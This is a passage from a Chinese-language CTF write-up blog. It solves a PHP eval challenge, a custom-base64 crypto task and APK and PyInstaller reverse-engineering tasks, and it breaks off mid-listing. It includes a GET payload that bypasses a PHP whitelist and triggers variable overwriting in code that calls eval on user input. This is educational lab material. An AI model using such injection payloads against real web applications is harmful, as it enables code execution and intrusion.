class=\"line\">    <span class=\"variable\">$security</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;flag&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">preg_match_all</span>(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$security</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NO!NO!NO!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span> .<span class=\"variable\">$content</span>.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$flag</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$flag</span> == <span class=\"string\">&quot;flag&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Senior high school student.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Here_is_flag!!!!!!!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>GET:X&#x3D;9999.1&amp;Y&#x3D;0e9835462117&amp;Z&#x3D;1;$flag&#x3D;0</p>\n<p>X进行小数点绕过</p>\n<p>Y进行0e开头MD5绕过</p>\n<p>Z进行变量覆盖，发现打印出许多flag文件</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922214151333.png\" alt=\"image-20240922214151333\"></p>\n<p>访问第三个是真的</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922214310173.png\" alt=\"image-20240922214310173\"></p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><p>不小心，下载附件之后发现与22年河北银行 手抖的小明一样</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"comment\"># python 3.6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># from flag import flag</span></span><br><span class=\"line\"><span class=\"comment\"># import re</span></span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"string\">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># assert re.match(r&#x27;^DASCTF\\&#123;[a-f0-9]+\\&#125;$&#x27;,flag) != None</span></span><br><span class=\"line\">flag = <span class=\"string\">&quot;DASCTF&#123;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode</span>(<span class=\"params\">inputs</span>):</span><br><span class=\"line\">    bin_str = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> inputs:</span><br><span class=\"line\">        x = <span class=\"built_in\">str</span>(<span class=\"built_in\">bin</span>(<span class=\"built_in\">ord</span>(i))).replace(<span class=\"string\">&#x27;0b&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        bin_str.append(<span class=\"string\">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x))</span><br><span class=\"line\">    outputs = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    nums = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> bin_str:</span><br><span class=\"line\">        temp_list = bin_str[:<span class=\"number\">3</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">len</span>(temp_list) != <span class=\"number\">3</span>):</span><br><span class=\"line\">            nums = <span class=\"number\">3</span> - <span class=\"built_in\">len</span>(temp_list)</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(temp_list) &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">                temp_list += [<span class=\"string\">&#x27;0&#x27;</span> * <span class=\"number\">8</span>]</span><br><span class=\"line\">        temp_str = <span class=\"string\">&quot;&quot;</span>.join(temp_list)</span><br><span class=\"line\">        temp_str_list = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">4</span>):</span><br><span class=\"line\">            temp_str_list.append(<span class=\"built_in\">int</span>(temp_str[i * <span class=\"number\">6</span>:(i + <span class=\"number\">1</span>) * <span class=\"number\">6</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nums:</span><br><span class=\"line\">            temp_str_list = temp_str_list[<span class=\"number\">0</span>:<span class=\"number\">4</span> - nums]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> temp_str_list:</span><br><span class=\"line\">            outputs += s[i]</span><br><span class=\"line\">        bin_str = bin_str[<span class=\"number\">3</span>:]</span><br><span class=\"line\">    outputs += nums * <span class=\"string\">&#x27;=&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> outputs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># c = encode(flag)</span></span><br><span class=\"line\"><span class=\"comment\"># print(c)</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class=\"line\">h = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class=\"line\">c = <span class=\"string\">&#x27;+Se++h+mF5u0d++Oc++RbQJYbyuMb++0cYuQc+SwdmK0d+fwcYRYG+&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#    +Se++h+mFYVPJv+zb+SYK+V4dvKRKQSXJ+uzJ++zJ+uRK3JXK+bYG+==</span></span><br><span class=\"line\">m = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> c:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(s.index(i))</span><br><span class=\"line\">    p = s.index(i)</span><br><span class=\"line\">    m += h[p]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(m)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># m = &quot;fQ==&quot; #</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">ss = <span class=\"string\">b&#x27;0123456789abcdef-_&#123;&#125;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ss = string.printable.encode()</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">aaa</span>(<span class=\"params\">idx, mm</span>):</span><br><span class=\"line\">    <span class=\"comment\"># print(mm, idx)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> idx &gt;= <span class=\"number\">4</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(idx, mm)</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            t = b64decode(mm)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">            <span class=\"comment\"># print(t)</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> t:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> v <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> ss:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;xxx &quot;</span>, t)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> mm[idx] == <span class=\"string\">&#x27;Q&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> <span class=\"string\">&quot;QRSTU&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == <span class=\"number\">0</span>:</span><br><span class=\"line\">                aaa(idx + <span class=\"number\">1</span>, v + mm[<span class=\"number\">1</span>:])</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> idx == <span class=\"number\">3</span>:</span><br><span class=\"line\">                aaa(idx + <span class=\"number\">1</span>, mm[<span class=\"number\">0</span>:<span class=\"number\">3</span>] + v)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                aaa(idx + <span class=\"number\">1</span>, mm[<span class=\"number\">0</span>:idx] + v + mm[idx + <span class=\"number\">1</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        aaa(idx + <span class=\"number\">1</span>, mm)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m = <span class=\"string\">&#x27;QEFQQ1QGezc4YWQhMQEzZQcwOWZkZjEyYQVhYQQhYQVkZDYyZQMzfQ==&#x27;</span></span><br><span class=\"line\">m = m[<span class=\"number\">8</span>:]  <span class=\"comment\"># GASCTF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(m), <span class=\"number\">4</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------&#x27;</span>, v, m[v: v + <span class=\"number\">4</span>])</span><br><span class=\"line\">    aaa(<span class=\"number\">0</span>, m[v: v + <span class=\"number\">4</span>])</span><br></pre></td></tr></table></figure>\n\n<p>将密文替换即可<img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240922111649066.png\" alt=\"image-20240922111649066\"></p>\n<p>解密flag拼接用<strong>flag{}包裹</strong></p>\n<h2 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h2><h3 id=\"ez-apk\"><a href=\"#ez-apk\" class=\"headerlink\" title=\"ez_apk\"></a>ez_apk</h3><p>再apk文件中找到AndroidMainfest.xml并查看相关函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\tpublic void onStart()&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">super</span>.onstart();</span><br><span class=\"line\">\t\tString string getstring(R.string.cipher);</span><br><span class=\"line\">\t\tbyte[]<span class=\"built_in\">bytes</span> string.getBytes();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i=<span class=\"number\">0</span>;i&lt;string.length();i++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">bytes</span>[i]=(byte)(<span class=\"built_in\">bytes</span>[i]^i);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tthis.cipher new string(<span class=\"built_in\">bytes</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">        public boolean checkcin(String <span class=\"built_in\">str</span>) &#123;</span><br><span class=\"line\">        byte[] <span class=\"built_in\">bytes</span> = getString(R.string.key).getBytes();</span><br><span class=\"line\">        char[] charArray = <span class=\"built_in\">str</span>.toCharArray();</span><br><span class=\"line\">        char[] cArr = new char[charArray.length];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; charArray.length; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (charArray[i] == <span class=\"string\">&#x27;_&#x27;</span> || charArray[i] == <span class=\"string\">&#x27;&#123;&#x27;</span> || charArray[i] == <span class=\"string\">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class=\"line\">                cArr[i] = charArray[i];</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (charArray[i] &lt; <span class=\"string\">&#x27;a&#x27;</span> || charArray[i] &gt; <span class=\"string\">&#x27;z&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                cArr[i] = (char) (((((<span class=\"built_in\">bytes</span>[i % <span class=\"built_in\">bytes</span>.length] - <span class=\"number\">97</span>) + charArray[i]) - <span class=\"number\">97</span>) % <span class=\"number\">26</span>) + <span class=\"number\">97</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> this.cipher.equals(new String(cArr));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看出在函数中进行一次异或，将字节进行异或运算以生成新的字节数组。最后将其转回字符串存储在cipher中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cArr[i] = (char) (((((<span class=\"built_in\">bytes</span>[i % <span class=\"built_in\">bytes</span>.length] - <span class=\"number\">97</span>) + charArray[i]) - <span class=\"number\">97</span>) % <span class=\"number\">26</span>) + <span class=\"number\">97</span>);</span><br><span class=\"line\"><span class=\"comment\">#bytes[i % bytes.length] 从密钥字节数组中获取当前字节。</span></span><br><span class=\"line\"><span class=\"comment\">#字符转换: charArray[i] - 97 将字符转换为从0开始的索引（例如，&#x27;a&#x27; -&gt; 0, &#x27;b&#x27; -&gt; 1, ..., &#x27;z&#x27; -&gt; 25）。</span></span><br></pre></td></tr></table></figure>\n\n<p>此处进行加密（凯撒变种加密）将关键词提取出来，用py编写解密脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_cin</span>(<span class=\"params\">s, key</span>):</span><br><span class=\"line\">    bytes_key = key.encode() </span><br><span class=\"line\">    c_arr = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(s):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;_&#x27;</span>, <span class=\"string\">&#x27;&#123;&#x27;</span>, <span class=\"string\">&#x27;&#125;&#x27;</span>]:</span><br><span class=\"line\">            c_arr.append(char)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;= char &lt;= <span class=\"string\">&#x27;z&#x27;</span>:</span><br><span class=\"line\">            shift = bytes_key[i % <span class=\"built_in\">len</span>(bytes_key)] - <span class=\"number\">97</span></span><br><span class=\"line\">            new_char = <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(char) - <span class=\"number\">97</span> - shift) % <span class=\"number\">26</span> + <span class=\"number\">97</span>)</span><br><span class=\"line\">            c_arr.append(new_char)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(c_arr)</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&quot;aptxcony&quot;</span> </span><br><span class=\"line\">result = check_cin(<span class=\"string\">&quot;fatd&#123;sm_cgrmvc_ylvhokhuk_gxsgffc_wtec&#125;&quot;</span>, key)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br><span class=\"line\"><span class=\"comment\">#得到flag flag&#123;ez_crypto_algorithm_reverse_haha&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"机器猫\"><a href=\"#机器猫\" class=\"headerlink\" title=\"机器猫\"></a>机器猫</h3><p>将py附件进行反编译</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python pyinstxtractor.py 2.exe</span><br><span class=\"line\">uncompyle6 2.pyc &gt; 2.py</span><br><span class=\"line\"><span class=\"comment\">#打开2.py</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span 